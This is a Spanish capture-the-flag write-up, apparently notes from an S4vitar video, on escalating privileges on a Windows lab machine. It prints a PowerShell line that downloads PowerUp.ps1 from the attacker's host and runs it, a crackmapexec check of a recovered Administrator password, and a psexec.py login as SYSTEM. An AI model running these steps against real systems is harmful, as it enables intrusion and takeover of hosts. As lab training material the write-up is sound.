## Escalada de Privilegios {-}

### Rootear la maquina {-}

```bash
whoami /priv
#Output

SEImpersonatePrivilege
```

Aqui ya vemos que podemos escalar privilegios con `JuicyPotatoe.exe` o `RotenPotatoe.exe` pero S4vitar nos
muestra aqui una via alternativa de escalar privilegios en esta maquina.

```bash
git clone https://github.com/PowerShellMafia/PowerSploit
cd PowerSploit
cd Privesc
vi PowerUp.ps1
```

Aqui vamos a hacer lo mismo que con el fichero `PS.ps1`. En vez de enviarlo y despues invocarlo, matamos dos pajaros
de un tiro y añadimos el **Invoke** al final del fichero `PowerUp.ps1`

```bash
Invoke-AllChecks
```

1. Creamos un servicio web con python

    ```bash
    python3 -m http.server 80
    ```

1. En la maquina victima

    ```bash
    IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/PowerUp.ps1')
    ```

Este script nos reporta un monton de cosas y aqui podemos ver

- SEImpersonatePrivilege
- Service UsoSvc
- encotro la contraseña para el usuario Administrator en un fichero Groups.xml

### Validamos las credenciales del usuario Administrator {-}

```bash
crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP
```

Ya vemos un **[+]** y un **(Pwn3d)**. Quiere decir que podemos connectarnos al systema con `psexec`

### Conexion con psexec.py {-}

```bash
psexec.py WORKGROUP/Administrator@10.10.10.125 cmd.exe

whoami
#Output
nt authority\system
```

Ya estamos como root y podemos ver la flag ;)

> [!] NOTA: S4vitar nos enseña mas tecnicas para conectarnos en el video. Os invito a verlas a partir del minuto 1:24:20